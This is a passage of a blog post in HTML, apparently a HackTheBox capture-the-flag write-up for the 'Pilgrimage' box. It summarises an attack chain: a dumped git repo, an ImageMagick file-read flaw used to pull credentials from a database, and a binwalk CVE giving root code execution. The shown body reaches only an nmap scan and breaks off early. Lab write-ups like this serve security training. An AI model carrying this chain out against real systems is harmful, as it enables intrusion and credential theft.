@@ -1,0 +1,1538 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Pilgrimage is an easy difficulty box with an exposed git repository available on the webpage. We can use git-dumper, and learn that uploaded images are processed by a vulnerable version of ImageMagick. We can abuse this to retrieve the SQLite database contents, which contain a user&#39;s login credentials. Entering the system, we learn a script running as root will analyze incoming image files with binwalk. By leveraging a recent binwalk CVE, we can supply a malicious png file and achieve remote code execution as root'><title>HackTheBox - Pilgrimage</title>
+
+<link rel='canonical' href='https://yuwenmichael.netlify.app/post/hackthebox-pilgrimage/'>
+
+<link rel="stylesheet" href="/scss/style.min.59703bed5f69041ffba70837d909b8000139e78c5201b54e051ae44c256c2d69.css"><meta property='og:title' content='HackTheBox - Pilgrimage'>
+<meta property='og:description' content='Pilgrimage is an easy difficulty box with an exposed git repository available on the webpage. We can use git-dumper, and learn that uploaded images are processed by a vulnerable version of ImageMagick. We can abuse this to retrieve the SQLite database contents, which contain a user&#39;s login credentials. Entering the system, we learn a script running as root will analyze incoming image files with binwalk. By leveraging a recent binwalk CVE, we can supply a malicious png file and achieve remote code execution as root'>
+<meta property='og:url' content='https://yuwenmichael.netlify.app/post/hackthebox-pilgrimage/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='git' /><meta property='article:tag' content='git-dumper' /><meta property='article:tag' content='ImageMagick' /><meta property='article:tag' content='Arbitrary File Read' /><meta property='article:tag' content='Cyberchef' /><meta property='article:tag' content='binwalk' /><meta property='article:published_time' content='2023-11-25T11:34:42-06:00'/><meta property='article:modified_time' content='2023-11-25T11:34:42-06:00'/><meta property='og:image' content='https://yuwenmichael.netlify.app/post/hackthebox-pilgrimage/Pilgrimage.png' />
+<meta name="twitter:title" content="HackTheBox - Pilgrimage">
+<meta name="twitter:description" content="Pilgrimage is an easy difficulty box with an exposed git repository available on the webpage. We can use git-dumper, and learn that uploaded images are processed by a vulnerable version of ImageMagick. We can abuse this to retrieve the SQLite database contents, which contain a user&#39;s login credentials. Entering the system, we learn a script running as root will analyze incoming image files with binwalk. By leveraging a recent binwalk CVE, we can supply a malicious png file and achieve remote code execution as root"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://yuwenmichael.netlify.app/post/hackthebox-pilgrimage/Pilgrimage.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu9f9ff13576eb7121750203f114cffc3e_12283_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/spencerja'
+                        target="_blank"
+                        title="Github"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://app.hackthebox.com/profile/1202496'
+                        target="_blank"
+                        title="HackTheBox"
+                    >
+                        
+                        
+                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+    preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" fill="currentColor" stroke="none">
+    <g>
+        <path
+            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
+        </path>
+    </g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://ctftime.org/team/217710'
+                        target="_blank"
+                        title="Team"
+                    >
+                        
+                        
+                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 220.000000 200.000000"
+    preserveAspectRatio="xMidYMid meet">
+    <g transform="translate(0.000000,200.000000) scale(0.100000,-0.100000)" fill="currentColor" stroke="none">
+        <path d="M365 1499 c201 -275 365 -503 365 -507 0 -4 -84 -120 -188 -259 -103
+            -139 -263 -355 -356 -480 -93 -125 -173 -229 -178 -231 -45 -19 101 -22 992
+            -22 l1000 0 0 1000 0 1000 -1000 0 -999 0 364 -501z m1310 -509 l0 -305 -312
+            -3 -313 -2 0 310 0 310 313 -2 312 -3 0 -305z" />
+        <path d="M1150 1194 c0 -2 -1 -95 -1 -206 l0 -203 216 -3 215 -2 0 210 0 210
+            -157 0 -158 0 98 -98 c53 -53 97 -101 97 -106 0 -4 -42 -48 -92 -97 l-93 -88
+            -28 26 -27 27 65 66 65 66 -100 101 c-55 55 -100 99 -100 97z" />
+    </g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://tryhackme.com/p/spencerj'
+                        target="_blank"
+                        title="TryHackMe"
+                    >
+                        
+                        
+                            <svg role="img" viewBox="0 0 24 24" fill="currentColor"  stroke-width="2" xmlns="http://www.w3.org/2000/svg"  stroke-linecap="round" stroke-linejoin="round">
+    <path d="M10.7048 0c-3.164 0-5.8024 2.2853-6.3563 5.2914C2.0493 5.5007.242 7.4381.242 9.7912c0 2.4918 2.0276 4.5191 4.5195 4.5191h6.7616a.625.625 0 000-1.2497H4.7615c-1.8031 0-3.2698-1.467-3.2698-3.2694 0-1.803 1.4667-3.2696 3.2698-3.2696.6552 0 1.287.1925 1.8274.5576a.6252.6252 0 00.8677-.1676.6251.6251 0 00-.168-.8678c-.5105-.345-1.0806-.5756-1.679-.6895.5105-2.3438 2.6006-4.1046 5.0952-4.1046 2.6578 0 4.8555 1.9984 5.1739 4.571a4.489 4.489 0 00-.488.3043.625.625 0 00-.1412.8724.6256.6256 0 00.8729.1408c.5587-.4036 1.2197-.6166 1.9114-.6166 1.547 0 2.894 1.0973 3.203 2.6102a.6254.6254 0 00.7378.4865c.3378-.0689.556-.3992.4871-.7377-.428-2.091-2.2903-3.6087-4.428-3.6087-.3254 0-.6455.037-.9574.1042C16.5567 2.3282 13.8986 0 10.7048 0zm5.1918 10.6402c-.1805 0-.3345.0358-.462.1078a.913.913 0 00-.3124.2909c-.0803.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0363.1639.095.3075.1753.4312a.909.909 0 00.3124.2964c.1275.0732.2815.11.462.11.1806 0 .3343-.0368.4607-.11a.8974.8974 0 00.3086-.2964c.0792-.1237.1372-.2673.1728-.4312a2.3737 2.3737 0 00.0544-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0937-.3046-.173-.4261a.901.901 0 00-.3085-.2909c-.1264-.072-.28-.1078-.4607-.1078zm6.4864 0c-.1806 0-.3347.0358-.4621.1078a.913.913 0 00-.3125.2909c-.0808.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0364.1639.0945.3075.1753.4312a.909.909 0 00.3125.2964c.1274.0732.2815.11.4621.11.1807 0 .334-.0368.4605-.11a.8974.8974 0 00.3086-.2964c.0793-.1237.1372-.2673.1729-.4312a2.3737 2.3737 0 00.0543-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0936-.3046-.1729-.4261a.9011.9011 0 00-.3086-.2909c-.1265-.072-.2798-.1078-.4605-.1078zm-8.5372.0682l-.8407.6175.3141.4294.4762-.3678v1.8773h.603v-2.5564zm6.4863 0l-.8413.6175.3146.4294.4762-.3678v1.8773h.6031v-2.5564zm-4.4355.4442c.0797 0 .1438.0284.1932.0848.0493.0564.0874.1263.114.2093a1.312 1.312 0 01.0542.2691 2.803 2.803 0 01.014.2637c0 .0818-.0048.1712-.014.2689a1.3044 1.3044 0 01-.0543.2707c-.0265.083-.0646.1529-.1139.2093-.0494.0569-.1135.0852-.1932.0852-.0792 0-.1443-.0283-.1947-.0852-.051-.0564-.09-.1263-.1178-.2093a1.244 1.244 0 01-.0557-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.249 1.249 0 01.0557-.269c.0278-.0831.0668-.153.1178-.2094.0504-.0564.1155-.0848.1947-.0848zm6.4864 0c.0793 0 .1436.0284.193.0848.0493.0564.0874.1263.114.2093.0266.083.0444.1732.0543.2691.0092.0966.014.1844.014.2637a2.91 2.91 0 01-.014.2689 1.3176 1.3176 0 01-.0543.2707c-.0266.083-.0647.1529-.114.2093-.0494.0569-.1137.0852-.193.0852-.0791 0-.1444-.0283-.1948-.0852-.051-.0564-.09-.1263-.1176-.2093a1.2445 1.2445 0 01-.056-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.2484 1.2484 0 01.056-.269c.0276-.0831.0666-.153.1176-.2094.0504-.0564.1157-.0848.1948-.0848zm-2.1915 3.5112c-.1806 0-.3347.0364-.4621.108a.9076.9076 0 00-.3125.2913c-.0808.1215-.1387.263-.1751.4257a2.3826 2.3826 0 00-.0541.5143c0 .1806.0183.3525.0541.5164.0364.1639.0943.3075.1751.4316a.9092.9092 0 00.3125.2956c.1274.0738.2815.1102.4621.1102.1807 0 .3336-.0364.46-.1102a.8922.8922 0 00.3087-.2956c.0797-.124.1371-.2677.1735-.4316a2.3755 2.3755 0 00.0543-.5164c0-.1801-.018-.352-.0543-.5143-.0364-.1627-.0938-.3042-.1735-.4257a.8904.8904 0 00-.3088-.2913c-.1263-.0716-.2792-.108-.4599-.108zm-6.4016.0684l-.8413.6177.3143.4296.4765-.3684v1.8775h.6033v-2.5564zm2.1252 0l-.8413.6177.314.4296.4768-.3684v1.8775h.6033v-2.5564zm2.116 0l-.8407.6177.3135.4296.4768-.3684v1.8775h.603v-2.5564zm2.1604.4442c.0792 0 .1438.028.1932.085.0493.0565.0874.1265.114.2095.026.083.0444.1725.0537.2691.0097.096.0146.1839.0146.263 0 .082-.0049.1715-.0146.2691a1.3243 1.3243 0 01-.0537.2706c-.0266.083-.0647.153-.114.2095-.0494.0569-.114.085-.1932.085-.0797 0-.1441-.0281-.195-.085-.0506-.0565-.0898-.1265-.1174-.2095a1.2443 1.2443 0 01-.0558-.2706 2.6765 2.6765 0 01-.0146-.269c0-.0792.0048-.1671.0146-.263a1.2413 1.2413 0 01.0558-.2692c.0276-.083.0668-.153.1173-.2095.051-.057.1154-.085.1951-.085zm-6.7291 3.0723c-.1312 0-.243.0264-.3358.0785a.6615.6615 0 00-.2268.2111c-.0586.0885-.1009.1914-.127.3096a1.6979 1.6979 0 00-.0394.3732c0 .1313.013.2562.0394.375.0261.1188.0684.2235.127.313a.6535.6535 0 00.2268.2152c.0927.0532.2046.0797.3358.0797.1307 0 .2424-.0265.334-.0797a.6501.6501 0 00.2241-.2152c.0575-.0895.0996-.1942.1258-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0262-.1182-.0683-.2211-.1258-.3096a.658.658 0 00-.2241-.2111c-.0916-.0521-.2033-.0785-.334-.0785zm3.0859 0c-.1314 0-.243.0264-.3358.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.101.1914-.127.3096a1.6895 1.6895 0 00-.0394.3732c0 .1313.0128.2562.0394.375.026.1188.0684.2235.127.313a.6532.6532 0 00.2268.2152c.0927.0532.2044.0797.3358.0797.1307 0 .2423-.0265.334-.0797a.6496.6496 0 00.224-.2152c.0574-.0895.0993-.1942.1258-.313a1.7415 1.7415 0 00.039-.375 1.724 1.724 0 00-.039-.3732c-.0265-.1182-.0684-.2211-.1259-.3096a.6575.6575 0 00-.224-.2111c-.0916-.0521-.2032-.0785-.334-.0785zm5.1077 0c-.1312 0-.2428.0264-.3356.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.1008.1914-.127.3096a1.6977 1.6977 0 00-.0396.3732c0 .1313.0132.2562.0397.375.0261.1188.0683.2235.127.313a.6532.6532 0 00.2267.2152c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6496.6496 0 00.224-.2152c.0575-.0895.0992-.1942.1259-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0267-.1182-.0684-.2211-.126-.3096a.6575.6575 0 00-.2239-.2111c-.0916-.0521-.2035-.0785-.3342-.0785zm-6.658.0498l-.611.4487.2279.3112.3462-.2669v1.3627h.4375v-1.8557zm3.0677 0l-.6106.4487.2282.3112.3462-.2669v1.3627h.4377v-1.8557zm5.1082 0l-.6109.4487.2285.3112.346-.2669v1.3627h.4377v-1.8557zm-9.7115.3228c.0575 0 .1041.0205.14.0612.0358.0412.0633.0917.0823.152a.9604.9604 0 01.0397.1952c.007.07.0102.134.0102.1915 0 .0597-.0031.1247-.0102.1952a.954.954 0 01-.0397.197c-.019.0602-.0465.1107-.0824.1519-.0358.0412-.0824.0612-.1399.0612-.058 0-.1053-.02-.1416-.0612-.037-.0412-.065-.0917-.0852-.152a.8863.8863 0 01-.0407-.1969 1.9609 1.9609 0 01-.0108-.1952c0-.0575.0037-.1215.0108-.1915a.893.893 0 01.0407-.1952c.0202-.0603.0483-.1108.0852-.152.0363-.0407.0836-.0612.1416-.0612zm3.0859 0c.0575 0 .1041.0205.14.0612a.421.421 0 01.0821.152.9392.9392 0 01.0397.1952c.007.07.0103.134.0103.1915 0 .0597-.0033.1247-.0103.1952a.9302.9302 0 01-.0397.197.4211.4211 0 01-.0822.1519c-.0358.0412-.0824.0612-.14.0612-.058 0-.1053-.02-.1417-.0612a.4192.4192 0 01-.085-.152.8458.8458 0 01-.0407-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.004-.1215.011-.1915a.8487.8487 0 01.0407-.1952.4196.4196 0 01.085-.152c.0364-.0407.0837-.0612.1418-.0612zm5.1077 0c.0575 0 .1044.0205.1402.0612a.421.421 0 01.0822.152.9483.9483 0 01.0398.1952c.007.07.0102.134.0102.1915 0 .0597-.0032.1247-.0102.1952a.9427.9427 0 01-.0398.197.421.421 0 01-.0822.1519c-.0358.0412-.0827.0612-.1402.0612-.058 0-.1051-.02-.1415-.0612-.0368-.0412-.065-.0917-.0857-.152a.9503.9503 0 01-.04-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.0039-.1215.011-.1915a.9589.9589 0 01.04-.1952c.0207-.0603.0489-.1108.0857-.152.0363-.0407.0835-.0612.1415-.0612zm-1.6842 1.8138c-.1312 0-.2428.0266-.3356.0787a.659.659 0 00-.2268.211c-.0586.0883-.1008.1914-.127.3097a1.7304 1.7304 0 00-.0396.3733c0 .1312.0137.256.0397.3746.026.119.0683.2237.127.3137a.656.656 0 00.2267.2148c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6475.6475 0 00.224-.2148c.0576-.09.0998-.1948.1259-.3137.026-.1187.039-.2434.039-.3746 0-.1307-.013-.2557-.039-.3733-.0261-.1183-.0683-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2035-.0787-.3342-.0787zm3.0627 0c-.1313 0-.243.0266-.3358.0787a.6641.6641 0 00-.2268.211c-.0586.0883-.101.1914-.127.3097a1.7218 1.7218 0 00-.0394.3733c0 .1312.0134.256.0395.3746.026.119.0683.2237.1269.3137a.6609.6609 0 00.2268.2148c.0928.0532.2045.0797.3358.0797s.2424-.0265.334-.0797a.6475.6475 0 00.224-.2148c.0575-.09.1-.1948.1259-.3137a1.7398 1.7398 0 00.0396-.3746c0-.1307-.0135-.2557-.0396-.3733-.026-.1183-.0684-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2027-.0787-.334-.0787zm-1.5448.05l-.6109.448.2284.3124.346-.2675v1.3626h.4378v-1.8555zm-1.5179.3228c.0575 0 .1041.0206.14.0613a.4206.4206 0 01.0826.1517.9575.9575 0 01.0396.1953c.007.07.0102.134.0102.1916 0 .0597-.0032.1245-.0102.195a.9512.9512 0 01-.0396.197.4218.4218 0 01-.0826.1519c-.0359.0412-.0825.0612-.14.0612-.058 0-.1052-.02-.1415-.0612-.0368-.0412-.065-.0917-.085-.152a.9149.9149 0 01-.0408-.1969 1.9608 1.9608 0 01-.011-.195c0-.0575.004-.1217.011-.1916a.9232.9232 0 01.0407-.1953c.0202-.0603.0483-.1105.085-.1517.0364-.0407.0836-.0613.1416-.0613zm3.0627 0c.0575 0 .104.0206.1398.0613a.4208.4208 0 01.0826.1517.939.939 0 01.0394.1953c.0071.07.0104.134.0104.1916 0 .0597-.0033.1245-.0104.195a.9296.9296 0 01-.0394.197.4218.4218 0 01-.0826.1519c-.0357.0412-.0823.0612-.1398.0612-.0575 0-.1054-.02-.1417-.0612-.037-.0412-.065-.0917-.085-.152a.9065.9065 0 01-.0408-.1969 1.9495 1.9495 0 01-.0103-.195c0-.0575.0033-.1217.0103-.1916a.9145.9145 0 01.0407-.1953c.02-.0603.0481-.1105.085-.1517.0364-.0407.0843-.0613.1418-.0613zm-9.7123.1855c-.091 0-.1686.0182-.2326.0545a.4563.4563 0 00-.157.146c-.0408.0613-.0702.133-.0881.2149a1.1685 1.1685 0 00-.0271.2587c0 .0907.0086.1773.027.2598.018.082.0474.1546.0881.217a.4589.4589 0 00.157.1487c.064.037.1417.0557.2327.0557.0907 0 .1677-.0188.2311-.0557a.4504.4504 0 00.1558-.1487c.0402-.0624.0688-.135.0873-.217a1.2187 1.2187 0 00.0272-.2598c0-.0911-.0093-.1774-.0272-.2587-.0185-.082-.0471-.1536-.0873-.2148a.4479.4479 0 00-.1558-.146c-.0634-.0364-.1403-.0546-.231-.0546zm1.0519.0346l-.423.3102.1577.2166.2398-.185v.9442h.3037v-1.286zm-1.0519.2236c.0396 0 .0724.0141.0973.0429a.2841.2841 0 01.057.105.689.689 0 01.0276.1352c.0044.0489.007.0927.007.1328 0 .0407-.0027.0862-.007.135a.684.684 0 01-.0277.1362.2845.2845 0 01-.057.1053c-.0248.0288-.0576.043-.0972.043a.1247.1247 0 01-.098-.043.2976.2976 0 01-.0592-.1053.612.612 0 01-.0283-.1361 1.391 1.391 0 01-.0069-.135c0-.0402.0021-.084.007-.1329a.6197.6197 0 01.0282-.1353.2973.2973 0 01.0592-.105.1248.1248 0 01.098-.0428zm3.7749 1.394c-.0907 0-.1681.0178-.2321.0542a.4517.4517 0 00-.1574.1463c-.0407.0608-.07.1326-.088.2144a1.1691 1.1691 0 00-.0276.2587c0 .0905.0092.1774.0277.26.0179.0824.0472.1545.0879.2168a.4562.4562 0 00.1574.1493c.064.0368.1414.0547.232.0547.0912 0 .1683-.0179.2318-.0547a.451.451 0 00.1556-.1493.6636.6636 0 00.0868-.2169 1.1889 1.1889 0 00.0277-.26c0-.0906-.0092-.1773-.0277-.2586-.0179-.0818-.0473-.1536-.0868-.2144a.4461.4461 0 00-.1556-.1463c-.0635-.0364-.1406-.0543-.2317-.0543zm1.0522.034l-.423.3109.1578.2158.2398-.1849v.9444h.3033v-1.2861zm-1.0522.2236c.0401 0 .0726.014.0976.0427a.3008.3008 0 01.057.1054.6431.6431 0 01.027.135 1.31 1.31 0 01.0077.1329c0 .0412-.0027.0863-.0077.135a.655.655 0 01-.027.1367.3066.3066 0 01-.057.1054c-.025.0282-.0575.0421-.0976.0421-.0396 0-.0728-.0139-.0977-.042a.2928.2928 0 01-.0592-.1055.6182.6182 0 01-.028-.1366 1.3641 1.3641 0 01-.0077-.1351c0-.0401.0029-.0841.0077-.1328a.6122.6122 0 01.028-.135.2874.2874 0 01.0592-.1055c.0249-.0287.0581-.0427.0977-.0427z"/>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/post/hackthebox-pilgrimage/">
+                <img src="/post/hackthebox-pilgrimage/Pilgrimage_hu3ac6b8ba1be9f0f197acee68b2bc6c42_314037_800x0_resize_box_3.png"
+                        srcset="/post/hackthebox-pilgrimage/Pilgrimage_hu3ac6b8ba1be9f0f197acee68b2bc6c42_314037_800x0_resize_box_3.png 800w, /post/hackthebox-pilgrimage/Pilgrimage_hu3ac6b8ba1be9f0f197acee68b2bc6c42_314037_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="606" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Pilgrimage" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-the-box/" >
+                Hack The Box
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/hackthebox-pilgrimage/">HackTheBox - Pilgrimage</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Pilgrimage is an easy difficulty box with an exposed git repository available on the webpage. We can use git-dumper, and learn that uploaded images are processed by a vulnerable version of ImageMagick. We can abuse this to retrieve the SQLite database contents, which contain a user&#39;s login credentials. Entering the system, we learn a script running as root will analyze incoming image files with binwalk. By leveraging a recent binwalk CVE, we can supply a malicious png file and achieve remote code execution as root
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Nov 25, 2023</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="foothold">Foothold</h2>
+<p>Initial nmap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Nmap scan report for 10.10.11.219
+</span></span><span class="line"><span class="cl">Host is up (0.056s latency).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
+</span></span><span class="line"><span class="cl">|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.18.0
+</span></span><span class="line"><span class="cl">|_http-server-header: nginx/1.18.0
+</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to http://pilgrimage.htb/
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 9.41 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The only ports available are <code>22</code> and <code>80</code>. Since <code>22</code> is related to ssh connection which requires valid credentials, we can start by checking port 80. Nmap shows us that visiting the website on port 80 results in a redirect to <code>http://pilgrimage.htb</code>. We can begin by adding this entry into our /etc/hosts file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Pilgrimage]
